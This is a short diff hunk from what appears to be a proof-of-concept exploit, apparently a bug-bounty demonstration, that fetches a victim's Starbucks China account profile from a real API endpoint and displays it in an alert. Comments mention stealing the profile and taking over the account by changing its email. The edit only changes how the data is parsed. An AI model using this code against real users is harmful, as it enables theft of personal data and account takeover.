@@ -37,7 +37,7 @@ async function getData(url = '') {
 //Try to steal the victim's profile
 getData('https://profile.starbucks.com.cn/api/account/detail')
   .then(data => {
-    alert("Your profile of starbucks account was stole by attacker!\n" + data); // JSON data parsed by `data.json()` call
+    alert("Your profile of starbucks account was stole by attacker!\n" + JSON.parse(data)); // JSON data parsed by `data.json()` call
   });
 
 //Try to takeover victim's account by modify the email address to attacker belongs
